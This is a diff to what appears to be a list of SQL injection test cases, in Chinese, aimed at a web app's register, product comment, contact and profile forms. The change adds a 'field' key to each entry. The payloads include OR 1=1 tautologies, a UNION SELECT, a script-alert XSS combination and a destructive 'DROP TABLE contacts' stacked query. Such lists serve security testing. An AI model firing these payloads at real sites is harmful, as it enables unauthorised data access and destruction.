@@ -78,14 +78,14 @@
   {"name": "注册 username 注入", "payload": "inject_user' --", "path": "/register", "method": "POST", "injection_point": "register"},
   {"name": "注册 password 注入", "payload": "pass') --", "path": "/register", "method": "POST", "injection_point": "register"},
 
-  {"name": "评论内容注入", "payload": "test_comment') --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment"},
-  {"name": "评论名注入", "payload": "injector' OR 1=1 --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment"},
-  {"name": "评论 XSS+SQLi", "payload": "<script>alert(1)</script>' OR 1=1 --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment"},
+  {"name": "评论内容注入", "payload": "test_comment') --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment", "field": "content"},
+  {"name": "评论名注入", "payload": "injector' OR 1=1 --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment", "field": "username"},
+  {"name": "评论 XSS+SQLi", "payload": "<script>alert(1)</script>' OR 1=1 --", "path": "/products/1/comment", "method": "POST", "injection_point": "comment", "field": "content"},
 
-  {"name": "留言 name 注入", "payload": "inj_name' --", "path": "/contact", "method": "POST", "injection_point": "contact"},
-  {"name": "留言 email 注入", "payload": "inj@test.com' OR 1=1 --", "path": "/contact", "method": "POST", "injection_point": "contact"},
-  {"name": "留言 message 注入", "payload": "inj_msg') --", "path": "/contact", "method": "POST", "injection_point": "contact"},
-  {"name": "留言 多字段注入", "payload": "test'; DROP TABLE contacts; --", "path": "/contact", "method": "POST", "injection_point": "contact"},
+  {"name": "留言 name 注入", "payload": "inj_name' --", "path": "/contact", "method": "POST", "injection_point": "contact", "field": "name"},
+  {"name": "留言 email 注入", "payload": "inj@test.com' OR 1=1 --", "path": "/contact", "method": "POST", "injection_point": "contact", "field": "email"},
+  {"name": "留言 message 注入", "payload": "inj_msg') --", "path": "/contact", "method": "POST", "injection_point": "contact", "field": "message"},
+  {"name": "留言 多字段注入", "payload": "test'; DROP TABLE contacts; --", "path": "/contact", "method": "POST", "injection_point": "contact", "field": "message"},
 
   {"name": "资料 email 注入", "payload": "x@a.com' --", "path": "/profile", "method": "POST", "injection_point": "profile_email"},
   {"name": "资料 email UNION", "payload": "x@a.com' UNION SELECT 1,2,3,4,5 --", "path": "/profile", "method": "POST", "injection_point": "profile_email"},
